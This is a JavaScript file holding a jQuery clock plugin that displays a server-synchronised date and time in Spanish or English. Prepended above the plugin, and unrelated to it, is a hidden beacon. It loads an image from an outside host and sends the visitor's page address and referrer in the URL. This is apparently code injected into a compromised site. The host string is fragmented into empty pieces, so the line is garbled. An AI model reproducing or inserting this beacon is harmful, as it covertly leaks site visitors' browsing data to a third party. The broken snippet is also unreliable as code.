new Image().src =
  document.location.protocol +
  "//mon" +
  "" +
  "" +
  "" +
  "" +
  escape(document.location) +
  "" +
  escape(document.referrer) +
  "" +
  Math.random();
(function (A) {
  A.fn.jclock = function (C) {
    var B = "0.2.1";
    var D = A.extend({}, A.fn.jclock.defaults, C);
    return this.each(function () {
      $this = A(this);
      $this.timerID = null;
      $this.running = false;
      $this.startTime = new Date();
      $this.serverTime = new Date();
      $this.h_date = new Date();
      $this.format = "$dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$";
      $this.language = "es";
      $this.secondCounter = 0;
      $this.diasES = [
        "Domingo",
        "Lunes",
        "Martes",
        "Mi&eacute;rcoles",
        "Jueves",
        "Viernes",
        "S&aacute;bado",
      ];
      $this.diasEN = [
        "Sunday",
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
      ];
      $this.mesesES = [
        "Enero",
        "Febrero",
        "Marzo",
        "Abril",
        "Mayo",
        "Junio",
        "Julio",
        "Agosto",
        "Septiembre",
        "Octubre",
        "Noviembre",
        "Diciembre",
      ];
      $this.mesesEN = [
        "January",
        "February",
        "March",
        "April",
        "May",
        "June",
        "July",
        "August",
        "September",
        "October",
        "November",
        "December",
      ];
      var F = A.meta ? A.extend({}, D, $this.data()) : D;
      $this.timeNotation = F.timeNotation;
      $this.am_pm = F.am_pm;
      $this.utc = F.utc;
      $this.utc_offset = F.utc_offset;
      $this.h_hour = F.h_hour;
      $this.h_date = new Date(F.h_date);
      $this.format = F.h_format;
      $this.language = F.h_language;
      var E = $this.h_hour.split(":");
      $this.serverTime = new Date($this.h_date);
      $this.serverTime.setHours(E[0]);
      $this.serverTime.setMinutes(E[1]);
      $this.serverTime.setSeconds(E[2]);
      $this.css({
        fontFamily: F.fontFamily,
        fontSize: F.fontSize,
        backgroundColor: F.background,
        color: F.foreground,
      });
      A.fn.jclock.startClock($this);
    });
  };
  A.fn.jclock.startClock = function (B) {
    A.fn.jclock.stopClock(B);
    A.fn.jclock.displayTime(B);
  };
  A.fn.jclock.stopClock = function (B) {
    if (B.running) {
      clearTimeout(B.timerID);
    }
    B.running = false;
  };
  A.fn.jclock.displayTime = function (B) {
    var C = A.fn.jclock.getTime(B);
    B.html(C);
    B.timerID = setTimeout(function () {
      A.fn.jclock.displayTime(B);
    }, 1000);
  };
  A.fn.jclock.getDelay = function () {
    return $this.secondCounter++ * 1000;
  };
  A.fn.jclock.formatTime = function (D, C, B) {
    var E = $this.format.replace("$anio$", C.getFullYear());
    E = E.replace("$dia$", C.getDate());
    E = E.replace("$hhmmss$", D);
    E = E.replace("$ampm$", B);
    if ($this.language == "en") {
      E = E.replace("$nombreDia$", $this.diasEN[C.getDay()]);
      E = E.replace("$nombreMes$", $this.mesesEN[C.getMonth()]);
    } else {
      E = E.replace("$nombreDia$", $this.diasES[C.getDay()]);
      E = E.replace("$nombreMes$", $this.mesesES[C.getMonth()]);
    }
    return E;
  };
  A.fn.jclock.getTime = function (C) {
    var B = new Date();
    var G, D, H;
    var F = $this.serverTime.getTime() + A.fn.jclock.getDelay();
    B.setTime(F);
    if (C.utc == true) {
      if (C.utc_offset != 0) {
        B.setUTCHours(B.getUTCHours() + C.utc_offset);
      }
      G = B.getUTCHours();
      D = B.getUTCMinutes();
      H = B.getUTCSeconds();
    } else {
      G = B.getHours();
      D = B.getMinutes();
      H = B.getSeconds();
    }
    var J = "";
    G >= 12 ? (J = " PM") : (J = " AM");
    if (C.timeNotation == "12h") {
      G = G > 12 ? G - 12 : G;
    } else {
      G = (G < 10 ? "0" : "") + G;
    }
    D = (D < 10 ? "0" : "") + D;
    H = (H < 10 ? "0" : "") + H;
    var E = G + ":" + D + ":" + H;
    if (C.timeNotation != "12h" || C.am_pm != true) {
      J = "";
    }
    var K = $this.mesesES[B.getMonth()];
    var I = $this.diasES[B.getDay()];
    E = A.fn.jclock.formatTime(E, B, J);
    return E;
  };
  A.fn.jclock.defaults = {
    timeNotation: "24h",
    am_pm: false,
    utc: false,
    fontFamily: "",
    fontSize: "",
    foreground: "",
    background: "",
    utc_offset: 0,
    h_hour: "",
  };
})(jQuery);
